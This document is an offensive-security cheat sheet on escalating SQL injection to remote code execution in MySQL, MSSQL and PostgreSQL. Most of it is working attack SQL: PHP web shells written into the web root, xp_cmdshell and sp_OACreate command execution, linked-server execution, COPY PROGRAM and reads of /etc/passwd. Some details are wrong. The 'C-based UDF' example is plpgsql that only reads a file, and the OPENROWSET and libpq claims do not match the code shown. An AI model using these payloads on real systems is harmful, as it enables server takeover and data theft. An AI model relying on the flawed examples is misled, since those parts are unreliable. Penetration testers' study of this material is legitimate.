# SQL To RCE

SQL Injection (SQLi) vulnerabilities can potentially escalate to **Remote Code Execution (RCE)** if certain conditions are met, depending on the target **database management system (DBMS)**. Here's how SQLi can be escalated to RCE across three common databases: **MySQL**, **MSSQL**, and **PostgreSQL**, along with the methods used.

***

## **MySQL: SQLi to RCE**

### **Method 1: INTO OUTFILE for Web Shell Upload**

* **Condition**: The MySQL user running the query has **file write permissions** (e.g., `FILE` privilege), and the web server is serving files from a directory writable by the database.
* **How it works**: By exploiting the `INTO OUTFILE` feature, an attacker can write arbitrary content (like a **PHP web shell**) to a directory served by the web server.

**Steps**:

1.  Write a web shell (or any code) to the file system using `INTO OUTFILE`:

    ```sql
    SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
    ```
2.  Access the uploaded file (`shell.php`) via a web browser and execute system commands by passing them as parameters:

    ```
    http://target.com/shell.php?cmd=whoami
    ```

* **Outcome**: RCE via the uploaded shell file.

### **Method 2: LOAD\_FILE() Function**

* **Condition**: The attacker needs to have **read access** to the file system.
* **How it works**: The `LOAD_FILE()` function can be used to read sensitive files from the server. If sensitive credentials or system files (e.g., `/etc/passwd`) are exposed, these can aid in escalating to RCE.

**Steps**:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

* While this doesn’t directly lead to RCE, it can expose critical system information that aids in escalation.

***

## **Microsoft SQL Server (MSSQL): SQLi to RCE**

### **Method 1: xp\_cmdshell Command Execution**

* **Condition**: The `xp_cmdshell` stored procedure is enabled (it is disabled by default but can be re-enabled if the attacker has administrative privileges).
* **How it works**: `xp_cmdshell` allows running arbitrary OS commands from SQL Server. An attacker can exploit SQLi to execute system commands.

**Steps**:

1.  Enable `xp_cmdshell` if it's disabled:

    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
2.  Use `xp_cmdshell` to execute OS commands:

    ```sql
    EXEC xp_cmdshell 'whoami';
    ```
3. The output will give the user running the SQL service, and further commands can be executed for RCE.

### **Method 2: sp\_OACreate COM Objects**

* **Condition**: The attacker has sufficient privileges to execute **OLE Automation Procedures**.
* **How it works**: The `sp_OACreate` procedure allows creating COM objects that can execute system commands.

**Steps**:

```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami';
```

* **Outcome**: RCE via system command execution.

### **Method 3: Linked Servers for Command Execution**

* **Condition**: SQL Server is configured with linked servers, allowing connections to remote systems.
* **How it works**: An attacker can exploit the `OPENROWSET` function to execute commands on a linked server, potentially leading to RCE on that system.

**Steps**:

```sql
EXEC('master..xp_cmdshell ''whoami''') AT [linked_server_name];
```

* **Outcome**: RCE on the linked server.

***

## **PostgreSQL: SQLi to RCE**

### **Method 1: COPY TO/FROM for Web Shell Upload**

* **Condition**: The attacker has write permissions on the file system, and PostgreSQL has access to a directory served by a web server.
* **How it works**: The `COPY` command can write query results to a file on the server, which can be used to upload a web shell.

**Steps**:

1.  Use `COPY` to write a web shell:

    ```sql
    COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
    ```
2.  Access the web shell via the browser:

    ```
    http://target.com/shell.php?cmd=whoami
    ```

### **Method 2: PostgreSQL User-Defined Functions (UDF)**

* **Condition**: The attacker can create and execute **User-Defined Functions** in languages like `C` or `PL/pgSQL`.
* **How it works**: PostgreSQL allows creating UDFs in various languages. An attacker can create a UDF in C that executes system commands, leading to RCE.

**Steps**:

1.  Create a C-based UDF to execute system commands:

    ```sql
    CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS void AS $$
    DECLARE
      result text;
    BEGIN
      result := pg_read_file('/etc/passwd', 0, 8192);
      RAISE NOTICE '%', result;
    END;
    $$ LANGUAGE plpgsql;
    ```
2.  Execute the command:

    ```sql
    SELECT exec_cmd('whoami');
    ```

### **Method 3: libpq `COPY PROGRAM` for Command Execution**

* **Condition**: The attacker needs to be able to leverage the `COPY PROGRAM` feature of the PostgreSQL `libpq` library.
* **How it works**: The `COPY PROGRAM` allows executing commands directly on the server when copying data to or from external files.

**Steps**:

```sql
COPY test_table FROM PROGRAM 'id';
```

* **Outcome**: Direct command execution leading to RCE.

***

#### Summary of SQLi to RCE Escalation:

| **Database**   | **Method**                   | **Conditions**                              | **RCE Methodology**                                      |
| -------------- | ---------------------------- | ------------------------------------------- | -------------------------------------------------------- |
| **MySQL**      | INTO OUTFILE                 | File write permissions (`FILE` privilege)   | Upload web shell or arbitrary file.                      |
|                | LOAD\_FILE()                 | File read permissions                       | Read sensitive files to escalate further.                |
| **MSSQL**      | xp\_cmdshell                 | `xp_cmdshell` enabled                       | Execute system commands directly.                        |
|                | sp\_OACreate                 | Admin privileges, OLE Automation enabled    | Execute commands through COM objects.                    |
|                | Linked Servers               | Linked server configured                    | Execute commands on remote linked servers.               |
| **PostgreSQL** | COPY TO/FROM                 | Write permissions on the file system        | Upload web shell or arbitrary file.                      |
|                | User-Defined Functions (UDF) | Ability to create UDFs in `C` or `PL/pgSQL` | Create a function that executes system commands.         |
|                | COPY PROGRAM                 | Access to `libpq` with `COPY PROGRAM`       | Execute system commands directly through `COPY PROGRAM`. |
